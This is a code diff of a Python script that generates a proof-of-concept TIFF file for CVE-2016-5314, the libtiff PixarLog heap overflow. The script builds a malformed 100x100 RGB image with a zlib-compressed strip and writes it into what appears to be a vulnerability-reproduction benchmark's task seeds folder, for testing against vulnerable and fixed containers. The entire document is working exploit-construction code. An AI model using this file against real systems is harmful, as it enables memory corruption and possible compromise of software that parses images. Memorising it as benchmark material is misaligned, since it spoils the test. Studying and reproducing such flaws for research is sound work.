@@ -2,65 +2,83 @@ import struct
 import zlib
 import os
 
+
 def build_poc():
-    header = b"II\x2a\x00\x08\x00\x00\x00"
-    
-    # We create a zlib payload that inflates to the packed size for the strip
-    packed_size = 100 * 100 * 3  # 30000
-    zlib_payload = zlib.compress(b'A' * packed_size)
+    # Little-endian TIFF header: 'II' 0x2A and IFD offset = 8
+    header = b"II*\x00\x08\x00\x00\x00"
 
-    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=100 and ImageLength=100
-    # (alloc 30000 bytes) while decompression writes 120000 bytes.
-    # 1 strip is required, so we build a strip table with 1 offset and byte count.
-    num_strips = 1
+    # Image geometry and strip layout
+    width = 100
+    height = 100
+    rows_per_strip = 100
+    spp = 3
+    bps = 8
+    num_strips = (height + rows_per_strip - 1) // rows_per_strip
 
-    # Build IFD entries; strip arrays will be stored after IFD.
+    # Each strip will contain this many uncompressed bytes
+    packed_size_per_strip = width * rows_per_strip * spp * bps // 8
+    zlib_payload = zlib.compress(b'A' * packed_size_per_strip, level=9)
+
+    # Build IFD entries. Use offsets (0) for arrays we will fill after computing layout.
     entries = [
-        (254, 4, 1, 0),             # NewSubfileType: 0
-        (256, 3, 1, 10),            # ImageWidth: 10
-        (257, 3, 1, 10),            # ImageLength: 10
-        (258, 3, 1, 8),             # BitsPerSample: 8
-        (259, 3, 1, 32909),         # Compression: PIXARLOG
-        (262, 3, 1, 2),             # PhotometricInterpretation: RGB
-        (273, 4, num_strips, 0),    # StripOffsets (offset placeholder)
-        (277, 3, 1, 3),             # SamplesPerPixel: 3
-        (278, 4, 1, 1),             # RowsPerStrip: 1
-        (279, 4, num_strips, 0)     # StripByteCounts (offset placeholder)
-    ]
-    
-    # IFD offset placeholders are fixed below once we know exact layout
-    strip_offsets_offset = 134
-    strip_bytecounts_offset = strip_offsets_offset + num_strips * 4
-    payload_offset = strip_bytecounts_offset + num_strips * 4
-
-    entries = [
-        (254, 4, 1, 0),             # NewSubfileType: 0
-        (256, 3, 1, 100),           # ImageWidth: 100
-        (257, 3, 1, 100),           # ImageLength: 100
-        (258, 3, 1, 8),             # BitsPerSample: 8 (all samples)
-        (259, 3, 1, 32909),         # Compression: PIXARLOG
-        (262, 3, 1, 2),             # PhotometricInterpretation: RGB
-        (273, 4, num_strips, strip_offsets_offset),
-        (277, 3, 1, 3),             # SamplesPerPixel: 3
-        (278, 4, 1, 100),           # RowsPerStrip: 100
-        (279, 4, num_strips, strip_bytecounts_offset),
-        (317, 3, 1, 2)              # Predictor: 2 (horizontal)
+        (254, 4, 1, 0),              # NewSubfileType
+        (256, 3, 1, width),          # ImageWidth
+        (257, 3, 1, height),         # ImageLength
+        (258, 3, 1, bps),            # BitsPerSample (one value for all samples)
+        (259, 3, 1, 32909),          # Compression: PIXARLOG
+        (262, 3, 1, 2),              # PhotometricInterpretation: RGB
+        (273, 4, num_strips, 0),     # StripOffsets (fill later)
+        (277, 3, 1, spp),            # SamplesPerPixel
+        (278, 4, 1, rows_per_strip), # RowsPerStrip
+        (279, 4, num_strips, 0),     # StripByteCounts (fill later)
+        (317, 3, 1, 2)               # Predictor: 2 (horizontal)
     ]
 
-    ifd = struct.pack("<H", len(entries))
+    # Sort entries by tag (common TIFF convention)
+    entries.sort(key=lambda e: e[0])
+
+    # Build IFD with placeholder values
+    n = len(entries)
+    ifd_entries = b""
     for tag, dtype, count, val in entries:
-        ifd += struct.pack("<HHII", tag, dtype, count, val)
-    ifd += struct.pack("<I", 0)
+        ifd_entries += struct.pack("<HHII", tag, dtype, count, val)
+    ifd = struct.pack("<H", n) + ifd_entries + struct.pack("<I", 0)
 
+    # Compute layout offsets
+    header_len = len(header)           # 8
+    ifd_len = len(ifd)
+    strip_offsets_offset = header_len + ifd_len
+    strip_offsets_size = num_strips * 4
+    strip_bytecounts_offset = strip_offsets_offset + strip_offsets_size
+    strip_bytecounts_size = num_strips * 4
+    payload_offset = strip_bytecounts_offset + strip_bytecounts_size
+
+    # Helper to replace the 4-byte value field for a tag in the IFD
+    def set_ifd_value(ifd_bytes, tag_to_set, new_val):
+        entries_bytes = ifd_bytes[2:2 + n * 12]
+        for i in range(n):
+            off = i * 12
+            tag = struct.unpack_from("<H", entries_bytes, off)[0]
+            if tag == tag_to_set:
+                val_pos = 2 + off + 8
+                return ifd_bytes[:val_pos] + struct.pack("<I", new_val) + ifd_bytes[val_pos + 4:]
+        raise ValueError(f"tag {tag_to_set} not found in IFD")
+
+    # Patch the offsets into the IFD
+    ifd = set_ifd_value(ifd, 273, strip_offsets_offset)
+    ifd = set_ifd_value(ifd, 279, strip_bytecounts_offset)
+
+    # Build strip arrays and payload
     strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
     strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
     payload_data = zlib_payload * num_strips
 
     return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data
 
+
 output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))
 
 with open(output_path, "wb") as f:
     f.write(build_poc())
-    
-print("PoC regenerated for CVE-2016-5314 (RowsPerStrip=100, ImageLength=100) - test with vuln/fixed containers")
+
+print("PoC regenerated for CVE-2016-5314 (100x100, RowsPerStrip=100) - test with vuln/fixed containers")
